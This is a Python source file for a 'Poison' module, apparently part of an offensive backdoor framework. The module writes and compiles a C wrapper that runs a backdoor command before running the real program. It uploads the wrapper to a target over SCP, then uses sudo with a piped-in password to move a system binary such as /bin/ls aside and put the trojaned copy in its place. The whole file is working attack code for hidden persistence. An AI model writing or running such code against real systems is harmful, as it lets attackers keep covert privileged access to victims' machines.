from module import *

class Poison(Module):
    
    def __init__(self, target, backdoor, core):
        self.core = core
        self.target = target
        self.name = "Poison"
        self.backdoor = backdoor
        self.options = {
                "name"    : Option("name", "ls", "name of command to poison", False),
                "location" : Option("location", "/bin", "where to put poisoned files into", False)
                }
    
    def exploit(self):
        name = self.get_value("name")
        loc = self.get_value("location")
        password = self.target.pword
        
        poison = open("tmp/poison.c", "w")
        poison.write("#include <stdlib.h>\nint main() {\nsystem(\"%s\");\nsystem(\"%s/share/%s\");\nreturn 0;\n }" % (self.backdoor.get_command(), loc, name))
        poison.close()
        os.system("gcc tmp/poison.c -o tmp/%s" % name)
        self.target.scpFiles(self, "tmp/" + name, False)
        self.target.ssh.exec_command("echo %s | sudo -S mkdir %s/share" % (password, loc)) # sudo fix
        self.target.ssh.exec_command("echo %s | sudo -S mv %s/%s %s/share/" % (password, loc, name, loc))
        self.target.ssh.exec_command("echo %s | sudo -S mv %s %s/" % (password, name, loc))
        print(GOOD + self.name + " module success")
